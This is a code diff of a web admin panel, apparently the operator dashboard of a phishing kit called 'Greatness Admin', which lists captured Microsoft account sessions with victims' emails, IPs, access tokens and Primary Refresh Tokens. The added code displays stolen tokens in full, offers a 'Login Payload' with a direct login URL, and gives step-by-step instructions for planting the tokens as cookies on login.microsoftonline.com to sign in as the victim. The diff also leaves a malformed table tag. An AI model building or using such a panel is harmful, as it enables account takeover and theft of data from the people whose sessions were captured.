@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Greatness Admin - PRT & Access Token Manager</title>
+    <title>Greatness Admin - Session Manager</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', sans-serif; background: #0a0e27; color: #e0e0e0; padding: 20px; }
@@ -25,8 +25,7 @@
         td { font-size: 12px; }
         .btn-view { background: #10b981; border: none; padding: 6px 12px; border-radius: 6px; color: white; cursor: pointer; font-size: 11px; margin: 2px; }
         .btn-prt { background: #f59e0b; }
-        .btn-session { background: #8b5cf6; }
-        .btn-refresh { background: #3b82f6; }
+        .btn-login { background: #8b5cf6; }
         .token-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #111635; border-radius: 16px; padding: 24px; width: 750px; max-width: 90%; z-index: 1000; border: 1px solid #3b82f6; max-height: 80vh; overflow-y: auto; }
         .token-modal pre { background: #0a0e27; padding: 12px; border-radius: 8px; overflow-x: auto; font-size: 10px; word-break: break-all; white-space: pre-wrap; }
         .overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 999; }
@@ -34,47 +33,39 @@
         .loading { text-align: center; padding: 40px; color: #6b7280; }
         .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #374151; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .prt-badge { background: #f59e0b; color: #1a1f3e; padding: 2px 6px; border-radius: 4px; font-size: 9px; font-weight: bold; }
-        .access-badge { background: #10b981; color: white; padding: 2px 6px; border-radius: 4px; font-size: 9px; }
-        .refresh-note { font-size: 10px; color: #8b8fbf; margin-top: 4px; }
+        .instruction-box { background: #1e293b; border-left: 3px solid #10b981; padding: 12px; margin-top: 10px; font-size: 11px; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <div class="logo">
-            <h1>Greatness Admin</h1>
-            <p>PRT (Permanent) + Auto-Refresh Access Tokens</p>
-        </div>
+        <div class="logo"><h1>Greatness Admin</h1><p>Session & Token Manager</p></div>
         <div class="badge" id="sessionCount">0 Sessions</div>
     </div>
 
     <div class="stats-grid">
         <div class="stat-card"><div class="stat-title">Total Sessions</div><div class="stat-value" id="totalSessions">0</div></div>
         <div class="stat-card"><div class="stat-title">With PRT</div><div class="stat-value" id="withPRT">0</div></div>
-        <div class="stat-card"><div class="stat-title">Auto-Refresh</div><div class="stat-value" id="autoRefreshStatus">Active</div></div>
-        <div class="stat-card"><div class="stat-title">Last Token Refresh</div><div class="stat-value" id="lastRefresh" style="font-size: 12px;">-</div></div>
+        <div class="stat-card"><div class="stat-title">Domains</div><div class="stat-value" id="domainCount">0</div></div>
+        <div class="stat-card"><div class="stat-title">Last Capture</div><div class="stat-value" id="lastCapture" style="font-size: 14px;">-</div></div>
     </div>
 
     <div class="tools-section">
         <div class="tools-grid">
-            <button class="tool-btn" id="refreshBtn">🔄 Refresh Dashboard</button>
-            <button class="tool-btn" id="forceRefreshBtn">⚡ Refresh All Access Tokens</button>
+            <button class="tool-btn" id="refreshBtn">🔄 Refresh</button>
             <button class="tool-btn" id="clearBtn">🗑️ Clear All</button>
-            <button class="tool-btn" id="exportBtn">📄 Export</button>
             <button class="tool-btn" id="addAccountBtn">➕ Add Account</button>
         </div>
     </div>
 
     <div class="table-container">
-        <h3>📋 Active Sessions - <span class="prt-badge">PRT (Permanent)</span> + <span class="access-badge">Access Token (Refreshes on demand)</span></h3>
-        <table>
+        <h3>📋 Captured Sessions</h3>
+        <td>
             <thead>
-                <tr><th>Email</th><th>IP</th><th>Session Key</th><th>PRT Status</th><th>Last Token Refresh</th><th>Actions</th></tr>
+                <tr><th>Email</th><th>Domain</th><th>IP</th><th>Session Key</th><th>PRT</th><th>Actions</th></tr>
             </thead>
             <tbody id="sessionsTableBody"><tr><td colspan="6" class="loading"><div class="spinner"></div> Loading...  </td></tr></tbody>
         </table>
-        <div class="refresh-note" style="margin-top: 10px;">💡 PRT (Refresh Token) stays the same. Access tokens are refreshed each time you click "Get Access Token" or "Refresh All".</div>
     </div>
 </div>
 
@@ -86,8 +77,6 @@
 </div>
 
 <script>
-    let autoRefreshInterval;
-    
     async function apiCall(endpoint, options = {}) {
         try {
             const response = await fetch(endpoint, { ...options, headers: { 'Content-Type': 'application/json' } });
@@ -108,118 +97,103 @@
     function renderTable(sessions) {
         const tbody = document.getElementById('sessionsTableBody');
         if (!sessions || sessions.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">No sessions. Click "Add Account" to authenticate. </td></tr>';
+            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">No sessions. Click "Add Account" to authenticate.  </td></tr>';
             return;
         }
         
         tbody.innerHTML = sessions.map(s => `
             <tr>
                 <td style="color:#60a5fa; font-weight:500;">${escapeHtml(s.email)}</td>
+                <td><span style="background:#1e293b; padding:2px 6px; border-radius:4px;">${escapeHtml(s.domain)}</span></td>
                 <td><code>${escapeHtml(s.ip || 'Unknown')}</code></td>
-                <td><code style="font-size:10px;">${escapeHtml(s.sessionKey?.substring(0, 20) || 'N/A')}...</code></td>
-                <td>${s.hasRefreshToken ? '<span style="color:#f59e0b;">✅ PRT Active (Permanent)</span>' : '<span style="color:#ef4444;">❌ No PRT</span>'}</td>
-                <td><small>${formatDate(s.lastRefreshed)}</small><br><small>Exp: ${s.tokenExpires}</small></td>
+                <td><code style="font-size:10px;">${escapeHtml(s.sessionKey?.substring(0, 16) || 'N/A')}...</code></td>
+                <td>${s.hasRefreshToken ? '<span style="color:#f59e0b;">✅ PRT</span>' : '<span style="color:#ef4444;">❌</span>'}</td>
                 <td>
-                    <button class="btn-view" onclick="getAccessToken('${s.sid}')">🔑 Get Access Token</button>
-                    ${s.hasRefreshToken ? `<button class="btn-view btn-prt" onclick="viewPRT('${s.sid}')">🔄 View PRT</button>` : ''}
-                    <button class="btn-view btn-session" onclick="viewSessionKey('${s.sid}')">🔐 Session Key</button>
+                    <button class="btn-view" onclick="getAccessToken('${s.sid}')">🔑 Access Token</button>
+                    <button class="btn-view btn-prt" onclick="getLoginPayload('${s.sid}')">🔐 Login Payload</button>
+                    ${s.hasRefreshToken ? `<button class="btn-view btn-prt" onclick="viewPRT('${s.sid}')">🔄 PRT</button>` : ''}
                 </td>
-            </table>
+            </tr>
         `).join('');
     }
 
-    // Get a FRESH access token (refreshes using PRT)
     async function getAccessToken(sid) {
-        const btn = event.target;
-        const originalText = btn.textContent;
-        btn.textContent = '🔄 Getting Fresh Token...';
-        btn.disabled = true;
-        
         document.getElementById('tokenModal').style.display = 'block';
         document.getElementById('overlay').style.display = 'block';
-        document.getElementById('tokenDetails').innerHTML = '<div class="loading"><div class="spinner"></div> Generating fresh access token using PRT...</div>';
+        document.getElementById('tokenDetails').innerHTML = '<div class="loading"><div class="spinner"></div> Getting fresh token...</div>';
         
         const data = await apiCall(`/api/session/token/${sid}`);
         
         if (data) {
-            document.getElementById('modalTitle').innerHTML = '🔐 FRESH Access Token';
+            document.getElementById('modalTitle').innerHTML = `🔐 Access Token - ${data.email}`;
             document.getElementById('tokenDetails').innerHTML = `
                 <p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
-                <p><strong>Refreshed At:</strong> ${new Date(data.refreshed_at).toLocaleTimeString()}</p>
-                <p><strong>PRT Used:</strong> <code style="font-size:10px;">${escapeHtml(data.refresh_token?.substring(0, 50))}...</code></p>
-                <p><strong>Note:</strong> ${data.note || 'PRT stays the same, only access token changed'}</p>
-                <p><strong>Fresh Access Token:</strong></p>
+                <p><strong>Domain:</strong> ${escapeHtml(data.domain)}</p>
+                <p><strong>Session Key:</strong> <code>${escapeHtml(data.sessionKey)}</code></p>
+                <p><strong>Access Token:</strong></p>
                 <pre>${escapeHtml(data.access_token)}</pre>
-                <p style="font-size: 11px; color: #10b981;">✅ This is a NEW access token, valid for ${data.expires_in} seconds</p>
-                <p style="font-size: 11px; color: #f59e0b;">🔄 The PRT (refresh_token) above is PERMANENT and can generate new tokens anytime</p>
+                <p><strong>Refresh Token (PRT):</strong></p>
+                <pre>${escapeHtml(data.refresh_token)}</pre>
+                <div class="instruction-box">
+                    <strong>🔧 How to use this token:</strong><br>
+                    1. Open browser DevTools (F12) → Application → Cookies<br>
+                    2. Navigate to <strong>https://login.microsoftonline.com</strong><br>
+                    3. Add a cookie named <strong>"accesstoken"</strong> with the value above<br>
+                    4. Add a cookie named <strong>"login_hint"</strong> with value "${escapeHtml(data.email)}"<br>
+                    5. Refresh the page - you should be logged in as ${escapeHtml(data.email)}
+                </div>
+                <p style="font-size: 11px; color: #10b981; margin-top: 10px;">✅ Token expires in ${data.expires_in} seconds</p>
             `;
-            loadSessions(); // Refresh table to show new timestamp
-        } else {
-            document.getElementById('tokenDetails').innerHTML = '<p style="color:#ef4444;">❌ Failed to get fresh token</p>';
         }
-        
-        btn.textContent = originalText;
-        btn.disabled = false;
     }
 
-    // View PRT (permanent, doesn't change)
-    async function viewPRT(sid) {
+    async function getLoginPayload(sid) {
         document.getElementById('tokenModal').style.display = 'block';
         document.getElementById('overlay').style.display = 'block';
-        document.getElementById('tokenDetails').innerHTML = '<div class="loading"><div class="spinner"></div> Loading PRT...</div>';
+        document.getElementById('tokenDetails').innerHTML = '<div class="loading"><div class="spinner"></div> Generating login payload...</div>';
         
-        const data = await apiCall(`/api/session/tokens/${sid}`);
+        const data = await apiCall(`/api/session/login/${sid}`);
         
         if (data) {
-            document.getElementById('modalTitle').innerHTML = '🔄 Primary Refresh Token (PRT) - PERMANENT';
+            document.getElementById('modalTitle').innerHTML = `🔐 Login Payload - ${data.email}`;
+            document.getElementById('tokenDetails').innerHTML = `
+                <p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
+                <p><strong>Domain:</strong> ${escapeHtml(data.domain)}</p>
+                <p><strong>Access Token:</strong></p>
+                <pre>${escapeHtml(data.access_token)}</pre>
+                <p><strong>PRT (Refresh Token):</strong></p>
+                <pre>${escapeHtml(data.refresh_token)}</pre>
+                <div class="instruction-box">
+                    <strong>🔧 Direct Login URL (copy and paste in browser):</strong><br>
+                    <a href="${escapeHtml(data.direct_login_url)}" target="_blank" style="color:#60a5fa; word-break:break-all;">${escapeHtml(data.direct_login_url.substring(0, 100))}...</a>
+                </div>
+                <div class="instruction-box">
+                    <strong>📋 Instructions for DevTools:</strong><br>
+                    <strong>Step 1:</strong> Open login.live.com or login.microsoftonline.com<br>
+                    <strong>Step 2:</strong> Open DevTools (F12) → Application → Cookies<br>
+                    <strong>Step 3:</strong> Add these cookies to <strong>https://login.microsoftonline.com</strong>:<br>
+                    &nbsp;&nbsp;• <strong>accesstoken</strong> = ${escapeHtml(data.access_token.substring(0, 50))}...<br>
+                    &nbsp;&nbsp;• <strong>login_hint</strong> = ${escapeHtml(data.email)}<br>
+                    &nbsp;&nbsp;• <strong>domain_hint</strong> = ${escapeHtml(data.domain)}<br>
+                    <strong>Step 4:</strong> Refresh the page - you will be logged in as ${escapeHtml(data.email)}
+                </div>
+            `;
+        }
+    }
+
+    async function viewPRT(sid) {
+        const data = await apiCall(`/api/session/tokens/${sid}`);
+        if (data) {
+            document.getElementById('modalTitle').innerHTML = `🔄 Primary Refresh Token (PRT) - ${data.email}`;
             document.getElementById('tokenDetails').innerHTML = `
                 <p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
                 <p><strong>PRT (Refresh Token):</strong></p>
                 <pre>${escapeHtml(data.refresh_token)}</pre>
-                <p style="font-size: 11px; color: #f59e0b;">⚠️ This PRT is PERMANENT and does NOT change on refresh.</p>
-                <p style="font-size: 11px; color: #10b981;">✅ Use this PRT to generate new access tokens anytime using /api/session/token/${sid}</p>
-                <p style="font-size: 11px; color: #8b5cf6;">🔑 Session Key: ${escapeHtml(data.sessionKey)}</p>
-            `;
-        }
-    }
-
-    // View Session Key
-    async function viewSessionKey(sid) {
-        const data = await apiCall(`/api/session/tokens/${sid}`);
-        if (data) {
-            document.getElementById('modalTitle').innerHTML = '🔐 Session Key';
-            document.getElementById('tokenDetails').innerHTML = `
-                <p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
-                <p><strong>Session Key:</strong></p>
-                <pre>${escapeHtml(data.sessionKey)}</pre>
-                <p style="font-size: 11px; color: #8b5cf6;">🔑 This key uniquely identifies this session</p>
+                <p style="font-size: 11px; color: #f59e0b;">⚠️ This PRT is PERMANENT and can generate new access tokens anytime.</p>
+                <p style="font-size: 11px; color: #10b981;">✅ Use this PRT with /api/session/token/${sid} to get fresh access tokens.</p>
             `;
             document.getElementById('tokenModal').style.display = 'block';
             document.getElementById('overlay').style.display = 'block';
-        }
-    }
-
-    async function forceRefreshAll() {
-        const btn = document.getElementById('forceRefreshBtn');
-        btn.textContent = '🔄 Refreshing All Access Tokens...';
-        btn.disabled = true;
-        
-        const result = await apiCall('/api/refresh-all', { method: 'POST' });
-        
-        if (result && result.success) {
-            btn.textContent = `✅ Refreshed ${result.count} access tokens (PRTs unchanged)`;
-            setTimeout(() => {
-                btn.textContent = '⚡ Refresh All Access Tokens';
-                btn.disabled = false;
-            }, 2000);
-            loadSessions();
-            document.getElementById('lastRefresh').innerHTML = new Date().toLocaleTimeString();
-        } else {
-            btn.textContent = '❌ Failed';
-            setTimeout(() => {
-                btn.textContent = '⚡ Refresh All Access Tokens';
-                btn.disabled = false;
-            }, 2000);
         }
     }
 
@@ -227,6 +201,9 @@
         document.getElementById('totalSessions').innerText = sessions.length;
         const withPRT = sessions.filter(s => s.hasRefreshToken).length;
         document.getElementById('withPRT').innerText = withPRT;
+        const uniqueDomains = new Set(sessions.map(s => s.domain));
+        document.getElementById('domainCount').innerText = uniqueDomains.size;
+        if (sessions.length > 0) document.getElementById('lastCapture').innerHTML = formatDate(sessions[0].capturedAt);
     }
 
     function closeModal() {
@@ -246,28 +223,14 @@
         } 
     }
     
-    async function exportData() { 
-        const data = await apiCall('/api/sessions'); 
-        if(data && data.sessions){ 
-            const blob = new Blob([JSON.stringify(data.sessions,null,2)],{type:'application/json'}); 
-            const a=document.createElement('a'); 
-            a.href=URL.createObjectURL(blob); 
-            a.download=`sessions_${Date.now()}.json`; 
-            a.click(); 
-        } 
-    }
-    
     function formatDate(d){ return d ? new Date(d).toLocaleString() : 'Unknown'; }
     function escapeHtml(str){ if(!str) return ''; return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]); }
 
     document.getElementById('refreshBtn').onclick = loadSessions;
-    document.getElementById('forceRefreshBtn').onclick = forceRefreshAll;
     document.getElementById('clearBtn').onclick = clearAll;
-    document.getElementById('exportBtn').onclick = exportData;
     document.getElementById('addAccountBtn').onclick = openAddAccount;
     
-    // Auto-refresh dashboard every 3 seconds
-    setInterval(loadSessions, 3000);
+    setInterval(loadSessions, 5000);
     loadSessions();
 </script>
 </body>
